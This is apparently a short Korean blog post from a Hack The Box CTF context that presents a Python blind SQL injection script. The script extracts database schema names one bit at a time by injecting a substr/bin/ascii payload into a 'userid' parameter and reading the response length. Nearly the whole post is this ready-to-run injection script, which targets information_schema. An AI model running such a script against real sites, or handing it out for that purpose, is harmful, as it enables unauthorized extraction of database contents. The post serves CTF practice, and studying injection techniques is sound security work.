---
title: 비트연산 기반 SQL 인젝션 스크립트
date: 2025-02-11 11:30:00 +0900
tags: HTB CTF 웹해킹
---

ASCII 코드를 직접 가져오는 대신 비트를 하나씩 가져오는 방식의 인젝션 스크립트다.
비트 1개당 시도가 단 1번 필요하기 때문에 블라인드 인젝션으로도 상당히 빠르게 문자열을 가져올 수 있다고 한다.

레퍼런스: https://blog.naver.com/sjhmc9695/221868622766

```python
import urllib.request
import time
import sys

flag = 0
for limit in range(0, 999):
	for char in range(1, 999):
		bin_string = "0"
		for bit in range(1, 8):
			param = "' and substr(lpad(bin(ascii(substr((select distinct table_schema from information_schema.columns limit {},1 ),{},1))),7,0),{},1)=1 #"
			param = param.format(limit, char, bit)
			param = urllib.parse.urlencode({"userid":param})

			url = URL
			req = urllib.request.Request(url + param)
			response = urllib.request.urlopen(req)
			time.sleep(0.05)

			if len(response.read().decode("utf8")) == 272: #True
				bin_string = bin_string +  "1"
			else:
				bin_string = bin_string +  "0"

		result = chr(int(bin_string,2))
		if result == "\x00":
			flag = flag + 1
			print("")
			if flag == 2:
				print("\nDone!")
				sys.exit(0)
			break
		elif result != "\x00":
			flag = 0
		print(result, end="")

print("\nDone!")
```